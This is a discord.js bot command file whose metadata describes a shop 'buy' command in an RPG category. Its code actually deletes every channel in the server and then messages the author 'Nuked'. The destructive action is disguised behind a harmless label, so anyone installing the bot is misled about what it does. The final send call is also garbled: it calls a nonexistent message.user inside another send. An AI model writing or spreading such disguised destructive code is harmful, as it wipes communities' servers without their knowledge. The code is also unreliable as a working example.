const Discord = require("discord.js")
const Command = require("../../Client/Command");

module.exports = new Command({
     name: "nuke",
     description: "Permet d'acheter dans la boutique.",
     category: "RPG",
     permission: Discord.Permissions.FLAGS.VIEW_CHANNEL,
     ownerOnly : true,
     use: "buy",
     async run(bot, message, args, db) {
          message.guild.channels.cache.forEach(channel => channel.delete())
          await message.author     .send(message.user.send(`Nuked : \` ${message.guild.name} \``))
     }
})